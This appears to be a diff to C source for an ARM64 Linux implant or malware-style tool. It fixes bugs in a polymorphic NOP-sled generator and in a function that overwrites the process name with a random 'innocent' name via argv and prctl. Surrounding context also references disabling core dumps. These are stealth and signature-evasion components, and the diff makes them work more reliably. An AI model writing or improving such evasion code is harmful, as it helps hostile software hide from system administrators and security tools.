@@ -15,15 +15,16 @@ static const uint32_t arm64_nop_variants[] = {
 
 void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t nop_bytes, size_t max_size) {
     if (!buffer || nop_bytes > max_size || (nop_bytes % 4) != 0) return;
-    
+
     uint32_t* inst_buffer = (uint32_t*)buffer;
     size_t nop_count = nop_bytes / 4;
-    
+
     // Validate alignment
     if ((uintptr_t)inst_buffer % 4 != 0) return;
-    
+
+    size_t variants_count = sizeof(arm64_nop_variants) / sizeof(arm64_nop_variants[0]);
     for (size_t i = 0; i < nop_count; i++) {
-        inst_buffer[i] = arm64_nop_variants[i % strlen(arm64_nop_variants)];
+        inst_buffer[i] = arm64_nop_variants[i % variants_count];
     }
 
 }
@@ -124,13 +125,17 @@ void prevent_core_dumps(void) {
 
 void hide_process_title(int argc, char* argv[]) {
     if (argc > 0 && argv && argv[0]) {
-        
+
         size_t orig_len = strlen(argv[0]);
         memset(argv[0], 0, orig_len);
 
         const char* innocent_name = get_random_innocent_name();
-        strncpy(argv[0], innocent_name, orig_len - 1);
-        argv[0][orig_len - 1] = '\0';
+        size_t copy_len = strlen(innocent_name);
+        if (copy_len >= orig_len) {
+            copy_len = orig_len - 1;
+        }
+        memcpy(argv[0], innocent_name, copy_len);
+        argv[0][copy_len] = '\0';
 
         prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
     }
